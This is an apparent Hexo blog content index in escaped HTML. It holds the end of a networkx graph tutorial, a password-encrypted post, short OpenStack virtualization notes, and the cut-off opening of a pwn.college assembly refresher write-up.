id=\"node\">node</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">G.add_node(<span class=\"number\">1</span>,c = <span class=\"string\">&#x27;qaq&#x27;</span>,a = <span class=\"number\">1</span>,b=<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(G.nodes[<span class=\"number\">1</span>])</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#x27;qwq&#x27;: &#x27;qaq&#x27;, &#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: &#x27;qaq&#x27;&#125;</span><br></pre></td></tr></table></figure>\n<h4><span id=\"edge\">edge</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(G.edges[<span class=\"number\">1</span>,<span class=\"number\">3</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">G.edges[<span class=\"number\">1</span>,<span class=\"number\">3</span>][<span class=\"string\">&#x27;a&#x27;</span>] = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(G.edges[<span class=\"number\">1</span>,<span class=\"number\">3</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">​</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;a&#x27;</span>: <span class=\"number\">1</span>&#125;</span><br></pre></td></tr></table></figure>\n<h4><span id=\"加权图\">加权图</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">FG = nx.Graph()</span><br><span class=\"line\">FG.add_weighted_edges_from([(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">0.125</span>), (<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">0.75</span>), (<span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">1.2</span>), (<span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">0.375</span>)])</span><br><span class=\"line\">nx.draw(FG,with_labels=<span class=\"literal\">True</span>, font_weight=<span class=\"string\">&#x27;bold&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%202.23.53%20AM.png\" alt=\"Screen Shot 2023-09-03 at 2.23.53 AM\"></p>\n<h2><span id=\"23-有向图\">2.3 有向图</span></h2><p>有向图就需要指定权重，并且节点会有出度值(out degree)以及入度值(in degree)。</p>\n<h5><span id=\"degree\">degree</span></h5><p>it tells you how many edges are connected to a particular node.<br>There are two types of degrees associated with a vertex:<br>For a DiGraph:</p>\n<ul>\n<li><strong>In-degree</strong> of a vertex is the number of edges pointing into the vertex.</li>\n<li><strong>Out-degree</strong> of a vertex is the number of edges pointing out of the vertex.</li>\n</ul>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%202.58.53%20AM.png\" alt=\"Screen Shot 2023-09-03 at 2.58.53 AM\"></p>\n<h2><span id=\"24-遍历\">2.4 遍历</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">G = nx.Graph()</span><br><span class=\"line\">G.add_weighted_edges_from(g_data)</span><br><span class=\"line\">d_gen = nx.dfs_edges(G,<span class=\"number\">1</span>)  <span class=\"comment\">#  按边深度搜索, 1为起点(Iterate over edges in a depth-first-search (DFS).)</span></span><br><span class=\"line\">b_gen = nx.bfs_edges(G,<span class=\"number\">1</span>) <span class=\"comment\">#按边广度搜索, 1为起点(Iterate over edges in a breadth-first-search starting at source.)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">list</span>(d_gen), <span class=\"built_in\">list</span>(b_gen))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(nx.dfs_tree(G,<span class=\"number\">1</span>).nodes())<span class=\"comment\">#Returns oriented tree constructed from a depth-first-search from source.</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[(1, 2), (2, 3), (3, 4), (4, 6), (6, 5)] [(1, 2), (1, 3), (1, 4), (2, 5), (3, 6)]</span><br><span class=\"line\">[1, 2, 3, 4, 6, 5]</span><br></pre></td></tr></table></figure>\n<h1><span id=\"3-reference\">3 reference</span></h1><p><a href=\"https://cloud.tencent.com/developer/article/1424759\">图论基础</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_42455699/article/details/104887393?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-104887393-blog-79447221.235%5Ev38%5Epc_relevant_default_base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-104887393-blog-79447221.235%5Ev38%5Epc_relevant_default_base&amp;utm_relevant_index=2\">networkx基础教程1</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/40852672\">Networkx基础教程1</a></p>\n<p><a href=\"https://www.osgeo.cn/networkx/reference/readwrite/generated/networkx.readwrite.edgelist.write_edgelist.html\">官方文档</a></p>\n<p>简单列举了networkx的基操，实际需要应用的比这个复杂多了，先写这么多。</p>\n","categories":["ML"],"tags":["GNN"]},{"title":"1","url":"/1919/08/10/note_%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F-1/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"02fe81ee37e5c61272fc4d3c2052ceafcee0919922fd3807ae24b78c8cd379d4\">eb2486355afec2905c177304e33e4d63de2959dc1d08b82ea6cebd38b86e1e324dd1c1817b299deda1f1513a1eaf6e5713c4554eba8ef214fcdc66f085e1186fe51a8887c1409ec299b8c39577a0606d1284213de6bf0bc90a1eac91d23fc89adce79bb706c4974002d2db9ff96e9ff967ec891a25ce549fa6cd36484ddca8c5e6ee510b824a72145b9b2393ffc97f72851d9a89f8acc697b8934e2385ed8807745726f979069299622985182e841464da7c6ad26392206d0d3780c7621dfb2edc58d0b65be944fce573f69306ac5440985d20baf98455523e647f3c0783d4b35d315511d520152a57b0753043bb7383c1321044a1ffe3b1b86c0d33ad5de9b5ef1e84dea880a6382b7739b26a43c9b6325ec92c1b64fba80df2791ea234dd5776807307079a9c47feb565e99c2a1bf5924955be49a19ed08f9194f97658d3c8b8f3c0aeae6c1128f3d57b46221ed4d8127875a801c88b3f1718ebc71d55c7c2c39c0265d4d8276fbc05f2461a4e63ca09593c8dce4d7871a452dbd3f48dab69e45e6852b1b537bd24a02d70c742a31f916adab41772533af25cb4540a649b838d348d4b1ff822746e5db555b7f7182bb0e16841ae28e7fa116114c796616e95a03c8d82329d244ee22c2d599cf9713cc509a775f71c3ac6fb570d739f450923d1b6a39d4cb2dfdcd5f98d5b4cfd0732c0782cf1b55948df0d5239fb8caaa44496fad779f7afa68a0237f0936e849b1b7bd423e34e0bb1d5e8fe6de2c61bc1830acb30d44ad399e573d454452ee1f1c9996dfbdeb20db0449a6df6a338b63dc937495ebe8bde71261583eddb9388fece37bd1828dd1769ded1dc6e23f4c7e1597591bc3acced72400f15e7ea851ba7721a7b21df2070988ca39bb191ec951f42548244ae978237850c114f69e878b8c2f8b902fd8c6362e4f149da44db31208dc529622c7f48bbad7e01a88fbaae892c3a2369d43fa75b000e4873c7dc9124cd7e34924de0ffafc719cee0e96b5789b3a87595e2ea5b44d93df0ffa54e7b31d0daad86f6c82ae7d0cb6c836db3bb8310c0a92cf76b75a2f8f3bc5a7e075e0400b6949738cc794445444aa75f511c7270805b075e4826cce82517ddcac0098fc5251d2dd0d4f9ec603757bfe580b97f8476d0419ae3317de3e6bbb42c077be90f3ecd4fbc56347f16dfa93ce657e9edd4f5f3513534ff8905ee8059cd3096756872f7bf66843543a56ab253c2197193a9d42a458892bea79412eac38cb2e4eac5f884067fd150b5f2665eac6f41c5a7ef12ec900888dcf6b915d06b0fa5fa68c35cedd46ff0437d338e5b36adecd6efed93119a02b32ed44f1194d33c867220e797695542707e849d99a023f491d403bf92b56a3732c84f6c2bfaf2383f55ec8c12cf9c6b009d9ab266f5c6df4f73344e1de662b8cb0073f58850e364d442f350a370a2fbe2f02363c2729278d02d4bafb74c8bc18d76653e72b5cb0e2bed44fbf4dac1c6d2433935e6befdef9ebfdbd16b32648eed4fd0f89095667e9e85c0965f425578c7f02b73f295e20577c92200cfed32bfda98ed37fa1d46fdb894de832fce0acb90662499a94f06e7f11f18d94c9719b09d80055ea72d01b4054734f07c549b6bf03907633509f83968774772de5ebeea243de8b0394796e688bed32606bdd77871eb6bd64f5e8727350f5e14609320b7ba8bcf84f8505d5a1b6141de2d7ae9a05bc8647c868461bfdbb6ccc41159a557bdec62622f2d4554840c4c9da0b9a429c87a3c8822680e0426c397c29952b42d985f4f883ed2cfc68667401f2777f64d127041267663ac45e2ca0e4352a7a82dcabb8e4a70e7639bf0b33ded6fa0d0c4b995267d12a0b1d65b96a105fff0b435511b1e7c37c7bed66a5860031c1b26a6f8f9cd65982f9ef535994f987a205a2fdcf994c736ed0d1f7845add41361c87cc6afeb85a060789aaadb4c120d780c27550b92f829a7ef99b34b3f430214764b8c78d4812c1bfd5bdd128dd8b2bd4c13de55dadfaa621fc290851026c38ffb950589ab63c772cc319d417aa6632490d93b2f000a6bc593ab537d39d5c77f20d758508a666259b5592eee0d1d919a84aa4f8bf9f6269f48700f52221da17f06147001a578b0f75201397745ca0dfa330e20e39ccf67d9b8b7d097ac9cd1744f3ed5f7361afb2f32d312a67c59da650f37b967cb339b59853ad6a24a89c8a7eb39559d16fa9b98fec8186476d37561fae32ccc428f6b06cece0bd0a14774aee9d4546391c0c3935d01096e249b0c4241d9927760ed3e4f6abe7272160f23db28cb24533f16a8b6d35ab9235407e640549064a6e813545b848f7bdcfa4863658d8d63701acbbb743cd35a1cf7945aea36be439df00ec3489efcf129da7a44d50d46cb0af3007eb6a3a81274b2371bdf6fd4fc05ac2ed61a071c9fcac37caf1f88d2e76b9788cfe3828b7ebb87f1d4d4d5d97513fd4c91fdeb46a1c030f66f92f391f9b4494edec893ac17883073b91204b11192fa6863aca0eb3a7825d878f0f8c9846f4c36175ef5209a437dd9e46c49bd15055051f544190b92cd03f56b9bbefe9ce79ff8b2db81ae18d057aa76e1d88f4f0c266da845cc0ae9d2d50a88210f92a78209198dee3dad0ac4db924f4154cdc50453136327aa34131cf23226316390c8304a5849f4f3304646f6656348a534343dd72808e568a3e5292f476c50562d03c147af4356223549542a6834d0acd01d67fd6f71295b4b50523a0291d270e6c921b1faf21d7085007532dc77d1e6f67cc1bdf049b4e0eee1174f32c66e895b10f9aceb8167b2a4f13a0f266a7d4a0ba0cd75996a22308be30bba3c246b0747d1c2952cfe4e7f1b67d0454b327025d20ed4c8a56ac6f66d8011ac42a3064e2769e5ffc025de8d1a1fc82e9e2e45725ec91186f2dae59a79b9891a190526ee079775db73ed71e20d949045234e2442dc917e475894eb538e6166c2e96fd98fd6392608fedff637186af78b07fde2bd75a2e6d9079284b96b111785ecb69d675e810587e2ea62976070d27b32c841b68994e19c2ff8d0923b0c1730f3b04fcf8fe0ec16f1b9cb63b7c519ddfdbedd3c3281e2f12f25a7f3c2cce8a37ca90159367a50e511ee998d5bbb2ba0df00b568f92556d89470bb13f7dfe06ce45556d6e9c6d3ea8a5c7d056696feb345ea718fb6f404858f5fc701110ff201dd367401faddcdb39a76f52035e5a0553fb93317851e35bcbf2024f15cc444ddf67780bba2b4374ac87f92b0486fc0eea72b4e75858ded50945d6689328366247fbf739cc51d8be44dc8eed5c0dc3e0afb6085694054629379ee9c04d255cabcadb3d0d66458d0396fad195dc4e6587174d1cf6d7a334f9d93d47da9c90110a8e043f7df6a6fa00fc7540ebfe18edb4a66331b92446b7327a3704cbfbefea3bdeb0df62e6a11bab7eac23f5fbfed97dce87449de864f8dbbc1ac35aa79618b4827f13427ae0e0d11f4a4797c19693a5b6a48df17d3b634f43004e14b8bba99f3eb899cff73b94a7511768fc06eb59633d6ffd15f2b766a39fcf94e460d07e847651b5cc1353989aa01611fc09b3e9d8ecf3baad29d8242959b5035d3f27d000ef7236969666d3f269e558783d65159e047321be35f415e64c7e9978c451f26500cae68f0803a55e826c121b16a7615fc04b89c19a86fd13cf8015c35c407d38b56df6d5d081c6e489d87182596e06bc8c21d90939e7802c5ab9a3cfc5b150e1e54b61d9e2505013a56e9de15f267866364709b605f5e16b45c88611117dcd04e644fc009583f60bf7ebf5f92eefb231834d9cdf3081bfe01623dd651c13ac4c88d0470311dabff0e6c55ea46f85fefda11f8ff4733008d20780d4ccf5c212b176b0298275944fe192f53097fa00418ff07a438649e9079168dae549f988d88a1b5c3a9b3dfdc31797cf94167e652c03f3ace4282038557ea837b4c1e40fb4aca25dc73656e04324e0ba49091852f30c7db0a9fa3eeade9e5dbd33fc5d535fdaeec7f28f7e33ce0eda834c6c0078f8848971021b65de693b3e3e75aee7ca00fe4333998eae85892350be8729db06199cbb71de1949fdf8218bf83b2885274e59bd5b5041d20a7c286852851993fc772d471164b6e9c0a032109a1aeb3b86970fccaa3624a4d83293a6091eb9f4d1a64cdc2aa01431b346880baef1a45d21d29c305941a7bb76d2c8a8f3e15614ac230933971d89971d11ada696b05580644c6a2d8dd26112adb2267638f2a7be8e493654075bc3c2ec5d50273aa80146c1e2c56c4993c24c752cd37fb9287276817c669815fb482c97589c78380796eb844c03b05ce5dabbcf3da596fae12a998b4c6b1722149918dc1d189bba76b444d530469efd24f6c42df47a8163ff5b1f2f1f186e9af25b7d1008d040bca02f6eb236d0bf06a4ea6375eb6b758d902224c554808e7963aa7e31eb23deba5d6c3e788075bacc88cc01a4eb1f59622dd2c2212e31d6afb4c653abd4c7b280c8e4f0aeec1e621db5210b056ca438b91d9dea630fe33e4fe75a8a49fea8338d0a5abdb35246e24cbd7f18297379cfc0ab6c272195a598134063c0e4fe46fdd5d4b7df7b450306841961b0904ad5584e16da5411da19c29ed0ae818be959b2abc0d8f9ca86e8f30951fde3c486b11d09aae9561150ad65324aee07c146532563b49bb2f91d935081099c71210f7edca94af499d6d61a114b09828e906ea6422f175102f84af49ace8c5894fbe74429301cea50899fbe894c86db0d04be3154878cac6177af4fe909c6f355d02aa34fe207d55df6545b84f12c9b5f932aad65bc29d4dd606399efd614e28eed759d7dfdf493573100910ffbfedf3de207e5d8abc7adeb6d2f376bdb87b5b347305663aa04708ab021fe2f2959a3b3cce1da9905ffa56ee8418f7d96de7b7f382c19481fd7456320783dd9365a277d3876223acee8fa3815a8334c5b53157d01995f216df641c9f3d9cc71f163df38887d297cf615859a0cc270c5db7fbfbba8a406af63105bb2faca79ac75ed15b7eff3cb6b01cea395beee245e894063edeaf03d3d001d1207508031f8d60ce66abe5ff43c3be0d021505d7ed47d72ede2471beb727534cde22f84310929e53ec16c1b0875ef53c3e864bc459bad65cfadd7613b5bd618e58f68865d3be5a5907d288e37d10479ced8f22aebcc21f18647b8148faa5aa39c99be603bd304dbb776d9c758540ab8b12371ba9e86488a6517ed4be4f4c71224af52e591d34418e7855b3dd5d9111adcea2414388f13fd2c28c01fd6ad111a867c266aff23527c9387cef205cea48f973df7f0c093e45c0526ccf503be1a544cd5c8be85e3a765a0c61065024766d242b355837b87b3be224c282ba29b9f9ab8aaa0c98b3c6208e6ceee70e57ac426cd9ab6c519712ac8a438bc4eb2a95c524bdc87686566b06a2959884713becf8137a5cab981bff65cb703ec2d7f6643d2395bb7f93e493946007a9f5c5bea7e787a08ac2a3175f895842b6c936b684a890777009026737876d98ea266333b360d4ce1098928519d1b5c3087d6c771227402c56ac3297921e3d7cac9b14517c2e6b99130f210777c41dca7ed000f8443da2ed43be64a451f9b6aac86def95fb59aaddf7130e63add8a4dca931db152f5dcbad3b73a2f20c99c8bf685ab1e07e0e86a29e2fd59c01f784cc3d1dc8ba902559b64e9afe956ee2e790bdabac9cdaade317d6d18ffb5de3ed41eaf1dbc33a283d3bb0cf181a7542d59637d3a8cb8d1271ba65e5ab205baee4abfb6be4a0dbe20b704a1303150a03bec151d73f5d61fbe223505febd0040f77d6d558b8153ae6320622e501edcb821be24e60eb8ed0822790bcb41df944c057f07208d35098af16208e4db25062e735fc61be38068622a23f48ab658bfe418c97ecc8b0f272024f1cdb46c236806aa118b5e9cc3ccba918bb24cdcb5b68b5f85b5b7b027b452bfd22dd279e977f22c68c66de0615df6791be24503003c49fc292648079cba55bf979b5c1b684df7b6c30878e6e8d1ee1bf5a947fc90d2dedbc9ce76a8fd48f30ce26a7fbce31469d15c8c0349dfec005ea773403d03d877c06dcd0cc81126919a17260b095be0a50199f95c95a1e5d0f3d42800abbaffb5f3dc485ae3cd56661d7cf975c71873197a22fde71d79d2d435e5a7b4cbe4fe71b99497cf2180de1c76bc5322a53a87a19546fdb6cf4a5529049ac6d9ef97d11c0c69ba2eebdca3669aa099adb5faee2a05c84c989e72cd0e036468f60230421bd718a91982d26984b3b305d6f6069ec518dcc87d510dbc03289ff8d7fa0745a7375f633e35df53982fccf5bece10132ef0ee8f583aebd02d8e4ee42755f160edda665fc0c9f81642e7d4a1ba9142d122d1c5d830dcb8c12f0cece02e43e7ff8cb710a7b86e4c1b71d12be44a96e02ed4c3273a11f02fcd4a74f909a7f70edee5b4e0b6abedf0cb2f09445cf450d4c8c052680e5a5bab944f7700cb32128b7bdf70f24738013ff1d86772b342db0b2c5718bef6c977612bd9f03fa055bad287a8741108111e7aac786bc0cc9e8fa2fd9a4ee4fab4b9e0ef23b570c5f6710e8fa3bc7666a53481dee06f22d2d9eff5582d48cf318cddaff4ff1a3b123d3b5afafd9c366ced69f18cf848577368f508357c74abfe074ec1a0af348f1fd73616f4fb870da5d0c3d5cad514ccb2aed744814e0a7a6147cc6b5a8f2da295e1c46568113c767c4dd11d72ab1fa37fdba2f106289669b9e24a04a3cb5b9d66afaf05db15ba5b9f793ab7cd0b8c580793c4eed0bbda38d16de0b4ddc78d63fd30726421cadc8028b859b0e652da2344cd86c524c9d9164e32b2e9cf42673da5dd7f17d7cb685360c025833a8b05c6ac9693abed4696a3ae5b4fedf70d9d23517264943a2b1636d42e17e1d83ce5110ba3a71d46d6394c76cda11a85fde195e4f5a0aa88b58f98935ffdcbb479f25937f41a6340a4505f08b986000ff2d51e7acc620c6782fb1b7eaf28d8d7d02c1e579fea78fcbfd39d731e46169cb8ad938dce69f8ac6ea44c97db014830c84712029566b4bae309310f71e50282df6fdbcdda182c23c2303e8f2aae9ebd88fa045f9eb8c62b3ae92f49369e9c8dcee21461b51611feddd00691c00fbbd38082a35c98c5cf5e383e42ad2a895afdfb0a22517abfc7ed03023a13f2f058fe16d2537b50b44d1a28fd19581b955f02c8e3f7b13efd138d1e28142a9de172e7727deaa4cd03244047fb6b3d3e92fe5ecea2ceac90f1c21d034b74f63793b8b1c6433ececd38e1d4d514d831859cd101be54bb01755613e3c824e02a84e2bcdb03b679b305e4c10fd965bedac0a52a9da71233a2e7594dde972758384568f1966639f283e4985beaf3a08468c6c736aaf1fb0e31e1bd219eea5be680f6332e9c52afe12b637e1652a6eda13bbfa831aedc593070c22d5c4dcc348cab4eaf50f955334ef9df3aea0a7db1a1b33ec9753617bc4fdf7a7e80eeb639df61e6ded070451b89ebec843733df268d3023063376ff7150c96292e85352b9afbc8602476f11dfff245167e915fe08db9951c8914703c04100a18c43b3bfadf24d2c9e249ff065d47a9a1561c8ad2a2d9f0a7af64934c8c02cd4e45db389c0f8c6e7d059fe00a427e40c5bb4a781ab3ff431c3755d41b1942bfbf5c7f94fe8c9908c80a3f3cd7a404a0f607e211a7e96dfd26bd25cc9ad4315a19cdd54aa9d1b7ceb4cd2a7f99bde3c4cdff87b4ffbf862d9d81c59dbfcff799e1635a69c7af1f09f940747fd62c136ce934c7c4397f2641e294b268e2e1b3411e3e74dd3c85e206b53abb0db3ca988e2dd556d6aaa6e76a8b2921448b4b63e07e15bb20db2e4c85746f76856c90a595e77066649cdc9a3ebe30f1e10fc80f596541058d15b53de9abcc51bdb27d88d9abc4aa0761f5c57802db8c94650d28d6809783a6a80eadf04e73d24303584170b1ab47c3f16b61e52a597824c874204f3005802a38e236a462adfc9c872da893bb2e28d67f8c84fa865c2bdcd55a349a6f5f4eeed1cc5c025698c1867d3301b1073ee194e13a9f750ab7070b845656c51fcfacd02d86e72088190aa08d5be762f9061996e5abdf97f603759c48f6ca00da9ce4d5187cb7019dbdbbb51c9056e674f27860a210ace686272e3ccd9c2ed39d9d86bbd0990801a2294fc692790d23d5fa30a6f131e78c0808f5358dd20dd30ffd557de99a28b13a3b271f4ec6b4d22bfd31c9a500a589adcaca7c628dc4e98ee2259d81669320b57f679781a9751ec082972c5366bc98ac9b7b6a93cb80bedb64554aa808a4ae655f8863cd130c457095719156928fc7f74591b294cbcd5d7e3df294f5f422e2af66b49b89d93c71a27a9968a59b2e508fb592b88d1b132da85da0fae8161edd909f84be1b3448b8c0d576bb492b5f9f0faaee6a7b15e8664be9cf7ce597786c4888b1dc4f3be5446bf16cf5874ac0a7a8b0de89dac2a8da34d80805b03056cdc7fb1697da06b576b0e9c4457de6d36bd07f5465e6f4b56cdfbccfd26d6f980cd96adf108e547132b39122d0c9ca96cd548097d43a3c56f9124f57d5243bd6158b35f5ac539e197c58fbd9d58f75e600c53e0190fd9c57dda8b1e95b0cb8a3afdeebf9d2eefe93c86703030267d3ed397c2166b5d3372d6b06b33e59a080d81d351fd58d94c1752516d10cd5810809ab56bdcb29a40a887c10a797554eb819ccee47bbd886bcc29f3ab5c417f4e1a5507d9bd04b3cf90bf88424afd9128658f4ce7fa8f0aa8afbf31c6ad801ceb9f921eb5561742b08b0ec4ca7d5a5df2c7c8bb723b95260bb86105b53f3d75ec681156beb2bdc8cb4478d8faff67922bcfc2677ca06784487b9bb87dd8436c744db53a34a53b1ceca9563f72431e1593a314405332091fd2f1022bca57077a8d700342fd2b649d58eafbfa5146db201865eca7d4a08a05320122a9bb94072bf07fd293fca0ae7b0f19f1bac12d170877f8531badb561c7299b62d7c1af588b7c8b2e742788663e544dd037c08bd3c4f1b79fa92b85c06c96684ee4aca75bdabd56f8c647c468752a44ea4e6d7e0791ddfc96697c7a524c284b5fbbfd7a45aa35210a22b8670a7552f3eb07f43a3234bd31f738d5d164d7fa26a608e4b2d805f2b899f4be28b32321bc26588fcff3e952d459230197bba70a1815a9f1f76d104b19374e01f1481a11e9a3d59e4d9380d9d592e100f1bcf15f26c81be5ef10bffd65d04876fed888615968d33ab85e1c6cf48c0947a2f37816f9f6cab0fa2e12ca68df35c4f709fa4e8db476813b688f59f1de0793520cd9133c7b4b8d53dc29f2774e8eb28166c83bf21ddf30ebb76b6ce569b2b0973be63ef4fa9c39fc466f85b22136b19d1a092c9f343c042af2be6b53970c689a01bc3a724d731a24e0f923ad901cd21b74209097e785ea4030c40bb6dbd631600dced223024e7f54eb99c2ca7fcb0cddeaaaf3c35f563fce605d7be2998147d7acbe99cbedca65e96fe06d5aebaa83b7b1c6f3de48b7523c41eee0c285336f2156655ca1b34ea6f9c93ee9f851bdc9d46a5ee152d8d76839b239cf4c81ac21b8ab8f2311da5fd4c62c5bc5f90fcb32a6285dacc2aff3e2351f5226a9ab5f92db418ddd3922223d5e2cd7b4f3357f0c7aa9fa69a64e2c6db0f38c1c0eccf1371192f1e56ef31e9e4ccb8c19ec73e502a21e23e3014642438fcab2b4fd47279f9d888b6de4e27df2c8f1e1255c6ddf5deb51a9994a5ef00dbb203248a627199e6daad157c2155dd31633cedc5f04d7c8d3ce3a35b6dfa4ba37dbe81a1e8c3ef4be409627012864f732923612faf471cb292c345142cd53556c23cf2f3782d059b57605f1b9e318596aecaf90391265ae4a4dab845dba608e63de8001ab3e2ad99e6c29417bea94ca2ea03804fd48f9bf5bd28722a969444969e874416dedf43bd90ec0d161e258aa0d253694ab19fb60a1750ddd17be16507e33687777edc37064974b0425e5a1ebedeb66fb7b8ab5338201516a62a48f7077610b2115f7a64f5ee5d5865429d468fd1c9de33872c8672810c3c06b859b128ea61fa074fc9102a56f1d70c11f43a56c02b53e317d79f99de0683d104407c08c958feaf49cee80c634f883b049ef91dc111113bd990855edf22ebf81c36fbc529d57d9f4343c743fe6a40eaf3666490311ab0f0d1d0ce171100e757ab0568ffa3c15aaa74ceee26223610e6e763684280bd334c5f01f891b1e15a0c23451dbe515f193a2028178ccc5008b5949916aa2ce1703144b2ee8a7927b020c01246bd9b824d23554df2d9f8f4f9e9e42073e7e9262bb8765558a3d344f19d5906f56bb7dcc6cf56f72b3dffc125bff65498cddd25a91675be00cc870234226265a7237dd5035aaad904dead3a7f7a08ed00540bd4f2386ab467b96ebe961fb35ed3b0b3650a5f5a608a202b8b5fb8fe2bc92af957eacde86317ed555ec99c6aa4788cb1365c249ef6f272d4fd88a17ce8cd9f5a0d3f12152139c9ce2ca0fa77f57c14fba3c9f34320101283787d1e5ad766ddea73f4f3aa1fa00ae81690265e504584c0227ac4b85a16bbc6916c43f10f496d375773f733ab99b5a0e12fcba7bc213dfaa52b5fb2998ce2544c593289ea8383ee88ee70965678733f61f0e0441466ff9595d668434d21f915a449d9df179d3033681ddb9e73cbe21a46e0be4e7c51c361295ee751e2dafd72643e0d1c30987ad6cce792b794c9bbdcbe68d9d0e5b10b9460198b99d0d949316b2b1f435719fe6bdc754661ab9de59607402761d103bf87387cb311b014a2f69a996a70060bc63df8d14a14a2a6279b4b1145df05f027dcca2c9700dc1df260d01b1e68d881fabdcf6f62dbb69fb1d2465d931beac1eb56c3dad33e1cfef8fed3986a1ebb0f78fc9815a3a9688721e9c02c8d60f80d4c3bdf078f83fbeb75a486338fe914cda94d98d3ff5bc7b7cca64559ef99fe34be1da5d576c5e4306782e7d02fbbbcc25e5a4d</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["深夜高速"]},{"title":"openstack学习笔记","url":"/2021/11/22/other_openstack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-ioGlWQEA\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        为了跟上网校的集群重构计划，这下狠狠地开始学习运维了。</p>\n<p>​        在开始具体的openstack学习之前，首先需要学习一下一些基本的运维概念。</p>\n<h3><span id=\"虚拟化容器化\">虚拟化/容器化</span></h3><p>​        之前在学习docker的时候对于容器化已经有一个比较到位的认知了，而与容器化相对应的虚拟化并没有深入理解。</p>\n<p>​        这里的虚拟化特指服务器虚拟化。就是在一台服务器上运行虚拟运行多个服务器。</p>\n<h3><span id=\"虚拟化分类\">虚拟化分类</span></h3><h4><span id=\"完全虚拟化\">完全虚拟化</span></h4><p>​        利用Hypervisor，将硬件与软件完全隔离，性能较差。</p>\n<h4><span id=\"准虚拟化\">准虚拟化</span></h4><p>​        改动操作系统，使操作系统以为自己是独立的。</p>\n<h4><span id=\"操作系统层虚拟化\">操作系统层虚拟化</span></h4><p>​        改动操作系统，使主机成为虚拟机管理软件。</p>\n<h4><span id=\"桌面虚拟\">桌面虚拟</span></h4><p>​        不讨论</p>\n<h4><span id=\"硬件虚拟\">硬件虚拟</span></h4><p>​        虚拟硬件而不是虚拟操作系统。</p>\n<h3><span id=\"虚拟化技术分类\">虚拟化技术分类</span></h3><p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["SRE"]},{"title":"Assembly_Refresher","url":"/2022/01/29/pwn.college_Assembly_Refresher/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-JVHlqDgl\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h4><span id=\"level1\">Level1</span></h4><p>需要设置<code>*rdi = 0x1337</code>，</p>\n<p>如果是按照目的意思程序的汇编代码长这样子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.section .text</span><br><span class=\"line\">    .intel_syntax 